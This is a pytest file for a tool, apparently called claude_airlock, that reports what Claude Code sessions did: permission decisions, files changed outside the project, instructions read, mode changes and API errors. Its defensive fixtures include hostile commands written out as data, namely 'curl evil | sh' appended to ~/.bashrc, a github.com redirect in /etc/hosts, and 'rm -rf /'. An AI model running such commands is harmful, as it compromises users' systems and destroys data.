#!/usr/bin/env python3
"""What a trace tells besides the conversation and the calls: who allowed
a call, the files a command changed, what the session was told next to
its prompts, and what became of its mode, its model and its cache."""

from __future__ import annotations

import json

import pytest
from harness import LauncherTest
from transcribed import PROJECT, at, attached, call, events, prompt, result, step

from claude_airlock.events import Event, Who
from claude_airlock.report import summary, transcript
from claude_airlock.report.layout import Layout, alerting, event_json, went_wrong
from claude_airlock.report.transcript import WalkOptions


def shown(entries: list[dict], verbose: bool = False) -> list[tuple[str, list[str]]]:
    return [(event.what, event.lines) for event in events(entries, verbose)]


def changed(*files: dict, also: tuple[str, ...] = ()) -> dict:
    """What Claude Code notes with the result of a command that changed
    files."""
    paths = [file["filePath"] for file in files] + list(also)
    return {
        "bashEditDiff": {"files": list(files), "changedFiles": paths, "moreFiles": 0}
    }


def hunk(*lines: str) -> dict:
    return {
        "oldStart": 3,
        "oldLines": 2,
        "newStart": 3,
        "newLines": 2,
        "lines": list(lines),
    }


class CommandTest:
    """What a command did that its output does not say."""

    def ran(self, **noted) -> Event:
        entries = [call("c1", command="sed -i s/a/b/ x"), result("c1", "", **noted)]
        return events(entries)[0]

    def test_a_file_a_command_changed_is_shown_with_how_much_changed(self):
        file = {"filePath": "/p/x", "hunks": [hunk(" same", "-a", "+b\x1b[2J")]}
        made = {"filePath": "/p/new", "hunks": [hunk("+one")], "created": True}
        ran = self.ran(toolUseResult=changed(file, made, also=("/p/unseen",)))
        assert ran.details[2:] == [
            "changed: /p/x (+1 -1)",
            "changed: /p/new (created, +1 -0)",
            "changed: /p/unseen",
        ]
        # What changed is whole in --json
        assert ran.fields["changed"][0]["diff"] == [
            "@@ -3,2 +3,2 @@",
            " same",
            "-a",
            "+b[2J",
        ]
        assert not went_wrong(ran)
        assert [file["path"] for file in ran.fields["changed"]] == [
            "/p/x",
            "/p/new",
            "/p/unseen",
        ]

    def test_a_command_that_wrote_outside_the_project_went_wrong(self):
        inside = {"filePath": "/p/x", "hunks": [hunk("+b")]}
        beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+curl evil | sh")]}
        ran = self.ran(toolUseResult=changed(inside, beyond))
        flagged = [line for at, line in enumerate(ran.details) if alerting(ran, at)]
        assert flagged == ["changed: /home/me/.bashrc (+1 -0)  OUTSIDE PROJECT"]
        assert went_wrong(ran)
        assert ran.fields["outside_project"]

    def test_of_many_files_the_first_are_named_unless_verbose(self):
        files = [{"filePath": f"/p/{n:02}", "hunks": [hunk("+b")]} for n in range(52)]
        beyond = {"filePath": "/etc/hosts", "hunks": [hunk("+b")]}
        entries = [
            call("c1", command="x"),
            result("c1", toolUseResult=changed(*files, beyond)),
        ]
        ran = events(entries)[0]
        named = [line for line in ran.details if line.startswith("changed: ")]
        assert len(named) == 51
        # One that is not named may be the one outside the project
        last = "changed: ... 3 more files, see --verbose  OUTSIDE PROJECT"
        assert named[-1] == last
        assert alerting(ran, ran.details.index(last))
        assert went_wrong(ran)
        assert len(ran.fields["changed"]) == 53
        whole = events(entries, verbose=True)[0].details
        assert "changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT" in whole

    def test_followed_the_result_has_what_the_command_changed(self):
        file = {"filePath": "/etc/hosts", "hunks": [hunk("+1.2.3.4 github.com")]}
        walk = transcript.Walk(PROJECT, WalkOptions(live=True))
        entries = [call("c1", command="x"), result("c1", toolUseResult=changed(file))]
        ended = [event for entry in entries for event in walk.take(entry)][1]
        assert ended.fields["stage"] == "result"
        assert "changed: /etc/hosts (+1 -0)  OUTSIDE PROJECT" in ended.details
        assert went_wrong(ended)

    def test_a_result_says_what_claude_code_noted_of_how_it_ended(self):
        noted = {
            "interrupted": True,
            "returnCodeInterpretation": "No matches\nfound",
            "persistedOutputPath": "/tmp/out.txt",
            "persistedOutputSize": 78750,
        }
        ran = self.ran(toolUseResult=noted)
        assert ran.details[1:] == [
            "result: ok, 1.0s, INTERRUPTED, No matches\\nfound",
            "output kept: /tmp/out.txt (79 kB)",
        ]
        plain = self.ran(toolUseResult={"interrupted": False, "stdout": "x"})
        assert plain.details[1:] == ["result: ok, 1.0s"]

    def test_who_allowed_a_call_is_said_when_it_was_not_the_mode(self):
        def ended(**decision) -> Event:
            return self.ran(permissionDecision=decision)

        by_mode = ended(decision="accept", source="config", reasonType="mode")
        assert by_mode.details[1] == "result: ok, 1.0s"
        assert "permission" not in by_mode.fields
        once = ended(decision="accept", source="user_temporary", grantScope="once")
        assert once.details[1] == "result: ok, 1.0s, allowed by you, once"
        assert not went_wrong(once)
        by_rule = ended(decision="accept", source="config", reasonType="rule")
        assert by_rule.details[1] == "result: ok, 1.0s, allowed by a rule"
        by_hook = ended(decision="accept", source="pre_tool\x1b_hook")
        assert by_hook.details[1] == "result: ok, 1.0s, allowed by pre tool hook"

    def test_a_call_that_was_refused_went_wrong(self):
        for decision, by in (
            ({"decision": "reject", "source": "user_reject"}, "you"),
            (
                {"decision": "reject", "source": "config", "reasonType": "rule"},
                "a rule",
            ),
            ({"decision": "reject", "source": "config"}, "the settings"),
            ({"decision": ["?"], "source": 7}, "?"),
        ):
            refused = self.ran(permissionDecision=decision)
            assert refused.details[1] == f"result: ok, 1.0s, REFUSED by {by}"
            assert went_wrong(refused)
            assert alerting(refused, 1)

    def test_what_went_wrong_is_told_by_what_ended_not_by_what_a_line_says(self):
        # Arguments named as the lines of a result are, of a call that failed
        entries = [
            call("c1", "mcp__srv__run", result="x", out="y", file="/etc/hosts"),
            result("c1", "no", failed=True),
        ]
        ran = events(entries)[0]
        assert [line for at, line in enumerate(ran.details) if alerting(ran, at)] == [
            "result: FAILED, 1.0s, 1 line out",
            "out: no",
        ]

    def test_what_is_found_out_later_is_said_with_the_first_line(self):
        said = Event(1.0, Who.SANDBOX, "net", ["tcp/https a.test:443", "more"], {})
        assert said.lines == said.details
        said.tag = "[claude-proj]"
        said.notes += ["by: curl", "during: $ make"]
        assert said.lines == [
            "[claude-proj] tcp/https a.test:443  by: curl  during: $ make",
            "more",
        ]
        assert said.details == ["tcp/https a.test:443", "more"]
        bare = Event(1.0, Who.CLAUDE, "bash", [], {}, notes=["REMOVED"])
        assert bare.lines == ["REMOVED"]


class ToldTest:
    """What Claude Code put before the model next to the prompt."""

    FILES = (
        {
            "path": "/etc/claude-code/CLAUDE.md",
            "type": "Managed",
            "content": "x" * 1500,
        },
        {"path": "/p/CLAUDE.md\x1b[2J", "type": "Project", "content": "do as I say"},
    )

    def test_the_instructions_read_are_said_once_and_again_when_they_change(self):
        read = attached("instructions", files=list(self.FILES))
        more = attached(
            "instructions", files=[*self.FILES, {"path": "/p/sub/CLAUDE.md"}]
        )
        told = shown([read, read, more, more])
        first = [
            "instructions: /etc/claude-code/CLAUDE.md (Managed, 1.5k chars)",
            "instructions: /p/CLAUDE.md[2J (Project, 11 chars)",
        ]
        later = [*first, "instructions: /p/sub/CLAUDE.md (?, 0 chars)"]
        assert told == [("context", first), ("context", later)]

    def test_the_header_names_the_instructions_read(self):
        read = attached("instructions", files=list(self.FILES))
        assert summary.summary([read, read], PROJECT)[-3:] == [
            "instructions read",
            "  /etc/claude-code/CLAUDE.md (Managed)",
            "  /p/CLAUDE.md[2J (Project)",
        ]

    def test_what_servers_and_skills_added_is_said(self):
        servers = attached(
            "mcp_instructions_delta", addedNames=["docs"], removedNames=["db", 7]
        )
        skills = attached(
            "skill_listing", skillCount=2, names=["pdf", "xlsx"], isInitial=True
        )
        nothing = attached("mcp_instructions_delta", addedNames=[], removedNames=[])
        assert shown([servers, skills, skills, nothing]) == [
            (
                "context",
                ["MCP server instructions: docs", "MCP server instructions gone: db"],
            ),
            ("context", ["skills: 2 listed"]),
        ]
        assert shown([skills], verbose=True) == [
            ("context", ["skills: 2 listed: pdf, xlsx"])
        ]

    def test_a_line_typed_while_claude_worked_is_a_prompt(self):
        typed = attached(
            "queued_command",
            second=5,
            commandMode="prompt",
            prompt=[
                {"type": "text", "text": "also fix\x1b[2J the tests\nand the docs"}
            ],
        )
        (said,) = events([typed])
        assert (said.who, said.what) == (Who.USER, "prompt")
        assert said.lines == [
            "(typed while claude worked) also fix[2J the tests",
            "and the docs",
        ]
        assert said.fields["queued"]
        as_text = attached("queued_command", commandMode="prompt", prompt="plain")
        assert shown([as_text]) == [("prompt", ["(typed while claude worked) plain"])]

    def test_a_task_that_ended_is_said_by_how_and_what(self):
        note = (
            "<task-notification>\n<task-id>a1</task-id>\n<status>completed</status>\n"
            '<summary>Agent "review" finished</summary>\n<result>long</result>'
        )
        ended = attached("queued_command", commandMode="task-notification", prompt=note)
        assert shown([ended]) == [("task", ['completed: Agent "review" finished'])]
        other = attached("queued_command", commandMode="bash", prompt="ls\nmore")
        assert shown([other]) == [("context", ["told (bash): ls"])]

    def test_a_mode_the_session_names_does_not_pass_for_a_kind_of_event(self):
        # Named as the kind of the event that holds the files read as
        # instructions, which this one does not
        forged = attached("queued_command", commandMode="instructions", prompt="x")
        (told,) = events([forged])
        assert told.details == ["told (instructions): x"]
        assert (told.fields["kind"], told.fields["mode"]) == ("told", "instructions")
        assert summary.planted_shown([told]) == 0
        # Nor is an event of that kind taken for more than it holds
        for files in (*HostileTest.ODD, [{"path": ["x"], "injection": [1]}]):
            fields = {"kind": "instructions", "files": files}
            odd = Event(1.0, Who.CLAUDE, "context", [], fields)
            assert summary.planted_shown([odd]) == 0
        bare = Event(1.0, Who.CLAUDE, "context", [], {"kind": "instructions"})
        assert summary.planted_shown([bare]) == 0
        # What the servers took back is not named as what an event says of
        # itself when it was taken out of the transcript
        servers = attached("mcp_instructions_delta", removedNames=["db"])
        (said,) = events([servers])
        assert (said.fields["gone"], "removed" in said.fields) == (["db"], False)

    def test_a_file_that_changed_behind_claude_is_said(self):
        edited = attached("edited_text_file", filename="/p/a.py", snippet="")
        assert shown([edited]) == [
            ("context", ["changed since claude read it: /p/a.py"])
        ]

    def test_what_a_language_server_reported_needs_verbose(self):
        found = {
            "message": "x is not\ndefined",
            "severity": "Error",
            "range": {"start": {"line": 119, "character": 4}},
        }
        report = attached(
            "diagnostics",
            files=[
                {"uri": "/p/a.py", "diagnostics": [found, {"severity": "Warning"}, 7]}
            ],
        )
        assert shown([report]) == []
        assert shown([report], verbose=True) == [
            (
                "context",
                [
                    "diagnostics: /p/a.py: 1 Error, 1 Warning",
                    "  Error line 120: x is not\\ndefined",
                    "  Warning: ",
                ],
            )
        ]


class SessionTest:
    """What became of the session itself."""

    def test_a_change_of_the_permission_mode_is_an_event_the_first_is_not(self):
        def mode(name: object) -> dict:
            return {"type": "permission-mode", "permissionMode": name}

        entries = [
            prompt("go", permissionMode="default"),
            mode("default"),
            mode("bypassPermissions"),
            mode("bypassPermissions"),
            mode(["x"]),
            prompt("on", second=9, permissionMode="plan"),
            # Of a subagent, which is not the session's
            prompt("sub", permissionMode="default", isSidechain=True),
        ]
        changes = [event for event in events(entries) if event.what == "mode"]
        assert [event.details for event in changes] == [
            ["permissions: bypassPermissions  was: default"],
            ["permissions: plan  was: bypassPermissions"],
        ]
        assert changes[0].fields == {"mode": "bypassPermissions", "was": "default"}
        # Ahead of the prompt it was given with
        assert [what for what, _ in shown(entries)][-2:] == ["mode", "prompt"]

    def test_a_change_of_model_or_effort_is_an_event(self):
        def request(model: object, effort: str = "medium", source: str = "sdk") -> dict:
            params = {"model": model, "output_config": {"effort": effort}}
            return {
                "type": "api-request",
                "timestamp": at(3),
                "querySource": source,
                "params": params,
            }

        entries = [
            request("fable"),
            request("fable"),
            # What else asks has a model of its own, which is no change
            request("haiku", source="title"),
            request("fable"),
            request("opus"),
            request("opus", effort="high"),
            request(None),
            {"type": "api-request", "params": "x"},
        ]
        assert shown(entries) == [
            ("model", ["opus, effort medium  was: fable, effort medium"]),
            ("model", ["opus, effort high  was: opus, effort medium"]),
        ]

    def test_api_trouble_is_said_and_went_wrong(self):
        error = {
            "message": "Connection error.",
            "formatted": "No response\x1b[2J from API",
        }
        failed = {
            "type": "system",
            "subtype": "api_error",
            "timestamp": at(4),
            "error": error,
            "retryInMs": 531,
            "retryAttempt": 1,
            "maxRetries": 10,
        }
        (said,) = events([failed])
        assert (said.what, said.details) == (
            "api",
            [
                "API error: No response[2J from API, tried again after 0.5s (retry 1 of 10)"
            ],
        )
        assert went_wrong(said)
        bare = {"type": "system", "subtype": "api_error", "error": 7, "retryInMs": "x"}
        assert shown([bare]) == [("api", ["API error: no reason given"])]

    def test_a_compaction_is_said(self):
        about = {"trigger": "auto", "preTokens": 152_300}
        compacted = {
            "type": "system",
            "subtype": "compact_boundary",
            "compactMetadata": about,
        }
        assert shown(
            [compacted, {"type": "system", "subtype": "compact_boundary"}]
        ) == [
            (
                "compact",
                ["the conversation was compacted (auto), 152.3k tokens before"],
            ),
            ("compact", ["the conversation was compacted"]),
        ]

    def test_a_walk_asked_for_the_steps_tells_them_without_verbose(self):
        entry = step("m1", 1, input_tokens=500, output_tokens=90)
        for steps, told in ((False, []), (True, ["step"])):
            walk = transcript.Walk(PROJECT, WalkOptions(live=True, steps=steps))
            assert [event.what for event in walk.take(entry)] == told

    def test_a_step_that_missed_the_cache_says_so_and_why(self):
        def read(step_id: str, second: int, cached: int, new: int) -> dict:
            return step(
                step_id,
                second,
                output_tokens=10,
                cache_read_input_tokens=cached,
                cache_creation_input_tokens=new,
            )

        dropped = attached(
            "thinking_drop",
            newlyDropped={"blockCount": 107, "reason": "model_mismatch"},
        )
        entries = [
            read("m1", 1, 0, 100_000),
            read("m2", 2, 100_000, 500),
            dropped,
            read("m3", 3, 30_000, 72_000),
            read("m4", 4, 102_000, 300),
            # After a pause, with nothing that says why
            read("m5", 5, 0, 103_000),
        ]
        steps = [details[0] for _, details in shown(entries, verbose=True)]
        assert [line.partition("  cache ")[2] for line in steps] == [
            "",
            "",
            "MISSED, 72.0k read anew: 107 thinking blocks dropped, model mismatch",
            "",
            "MISSED, 103.0k read anew",
        ]
        missed = events(entries, verbose=True)[2]
        assert missed.fields["cache_missed"] == 72000
        assert not went_wrong(missed)

    def test_after_a_compaction_a_smaller_conversation_is_no_miss(self):
        entries = [
            step("m1", 1, output_tokens=1, cache_creation_input_tokens=100_000),
            {"type": "system", "subtype": "compact_boundary"},
            step("m2", 2, output_tokens=1, cache_creation_input_tokens=9_000),
        ]
        said = [
            details[0]
            for what, details in shown(entries, verbose=True)
            if what == "step"
        ]
        assert not any("MISSED" in line for line in said)

    def test_an_aside_between_a_call_and_its_result_names_the_result(self):
        walk = transcript.Walk(PROJECT, WalkOptions(live=True))
        edited = attached("edited_text_file", filename="/p/a.py")
        entries = [call("c1", command="make"), edited, result("c1", "done")]
        ended = [event for entry in entries for event in walk.take(entry)][-1]
        assert ended.details[0] == "of: $ make"


class HostileTest:
    """A transcript is the session's to write: no shape of these entries
    stops the reading, and none of them reaches a terminal as it is."""

    ODD: tuple[object, ...] = (
        None,
        7,
        1e999,
        "x\x1b[2J",
        ["x"],
        {"x": {"y": []}},
        [[[]]],
        True,
        -1,
        10**400,
    )

    def test_no_shape_of_what_is_told_stops_the_reading(self):
        kinds = (
            "instructions",
            "mcp_instructions_delta",
            "skill_listing",
            "queued_command",
            "edited_text_file",
            "diagnostics",
            "thinking_drop",
        )
        keys = (
            "files",
            "addedNames",
            "removedNames",
            "names",
            "skillCount",
            "prompt",
            "commandMode",
            "filename",
            "newlyDropped",
        )
        entries: list[dict] = [
            {"type": "attachment", "attachment": odd} for odd in self.ODD
        ]
        for odd in self.ODD:
            entries += [attached(kind, **dict.fromkeys(keys, odd)) for kind in kinds]
            entries += [
                attached("instructions", files=[odd, {"path": odd, "type": odd}])
            ]
            # A mode named as each kind of event the launcher has
            entries += [
                attached("queued_command", commandMode=kind, prompt=odd)
                for kind in ("instructions", "mcp_instructions", "skills", "told")
            ]
            entries += [
                attached("diagnostics", files=[{"uri": odd, "diagnostics": [odd]}])
            ]
            entries += [
                {"type": "attachment", "attachment": {"type": odd}},
                {"type": "system", "subtype": odd},
                {
                    "type": "system",
                    "subtype": "api_error",
                    "error": odd,
                    "retryInMs": odd,
                },
                {
                    "type": "system",
                    "subtype": "compact_boundary",
                    "compactMetadata": odd,
                },
                {"type": "permission-mode", "permissionMode": odd},
                {"type": "api-request", "params": odd, "querySource": odd},
                {"type": "api-request", "params": {"model": odd, "output_config": odd}},
                call("c", command="x"),
                result("c", toolUseResult=odd, permissionDecision=odd),
                call("d", command="x"),
                result(
                    "d",
                    toolUseResult={
                        "bashEditDiff": {
                            "files": [odd, {"filePath": odd, "hunks": [odd]}]
                        },
                        "interrupted": odd,
                        "returnCodeInterpretation": odd,
                        "persistedOutputPath": odd,
                        "persistedOutputSize": odd,
                    },
                    permissionDecision=dict.fromkeys(
                        ("decision", "source", "grantScope"), odd
                    ),
                ),
                call("e", command="x"),
                result("e", toolUseResult={"bashEditDiff": odd}),
                call("f", command="x"),
                result(
                    "f",
                    toolUseResult={
                        "bashEditDiff": {
                            "changedFiles": odd,
                            "files": [
                                {
                                    "filePath": "/p/x",
                                    "hunks": [{**hunk(), "lines": odd}],
                                }
                            ],
                        }
                    },
                ),
            ]
        layout = Layout()
        for verbose in (False, True):
            found = events(entries, verbose)
            walk = transcript.Walk(PROJECT, WalkOptions(verbose, live=True))
            found += [event for entry in entries for event in walk.take(entry)]
            for event in found:
                json.loads(event_json("s", event))
                for line in layout.event(event):
                    assert "\x1b" not in line
            summary.planted_shown(found)
        summary.summary(entries, PROJECT)


class TraceTest(LauncherTest):
    """The same through --trace: the header, and what --failed keeps."""

    SESSION = "3fa9c0de-0000-4000-8000-000000000000"

    @pytest.fixture(autouse=True)
    def traced_session(self, sandbox: None) -> None:
        beyond = {"filePath": "/home/me/.bashrc", "hunks": [hunk("+x")]}
        refusal = {"decision": "reject", "source": "user_reject"}
        self.write_transcript(
            self.SESSION,
            [
                prompt("go", permissionMode="default"),
                attached(
                    "instructions", files=[{"path": "/p/CLAUDE.md", "type": "Project"}]
                ),
                call("c1", command="echo x >> ~/.bashrc"),
                result("c1", toolUseResult=changed(beyond)),
                call("c2", second=3, command="rm -rf /"),
                result("c2", "no", second=4, failed=True, permissionDecision=refusal),
                {"type": "permission-mode", "permissionMode": "bypassPermissions"},
                {
                    "type": "system",
                    "subtype": "api_error",
                    "timestamp": at(5),
                    "error": "down",
                },
            ],
        )

    def test_the_header_counts_what_commands_wrote_and_what_was_refused(self):
        header = self.launch("--trace").stdout
        for expected in (
            "# refused     1 calls were not allowed to run",
            "# instructions read\n#   /p/CLAUDE.md (Project)",
            "# files written\n#   /home/me/.bashrc x1  OUTSIDE PROJECT",
            "claude   mode        permissions: bypassPermissions  was: default",
        ):
            assert expected in header

    def test_failed_keeps_a_refusal_a_write_outside_and_api_trouble(self):
        failed = self.launch("--trace", "--failed").stdout
        kept = [line for line in failed.splitlines() if not line.startswith("#")]
        assert [
            line.split(maxsplit=4)[3:]
            for line in kept
            if "result:" in line or "API" in line
        ] == [
            ["bash", "result: ok, 1.0s"],
            ["bash", "result: FAILED, 1.0s, REFUSED by you, 1 line out"],
            ["api", "API error: down"],
        ]
        assert "instructions:" not in "\n".join(kept)
        only = self.launch("--trace", "--only", "mode,context").stdout
        assert [
            line.split()[3] for line in only.splitlines() if not line.startswith("#")
        ] == ["context", "mode"]

    def test_json_has_the_values_of_each(self):
        lines = self.launch("--trace", "--json").stdout.splitlines()
        by_what = {json.loads(line)["what"]: json.loads(line) for line in lines}
        assert by_what["mode"]["was"] == "default"
        assert by_what["api"]["error"] == "down"
        assert by_what["context"]["files"][0]["path"] == "/p/CLAUDE.md"
        ran = [json.loads(line) for line in lines if json.loads(line)["what"] == "bash"]
        assert ran[0]["changed"][0]["diff"] == ["@@ -3,2 +3,2 @@", "+x"]
        assert (ran[1]["permission"], ran[1]["permission_by"], ran[1]["refused"]) == (
            "reject",
            "you",
            True,
        )
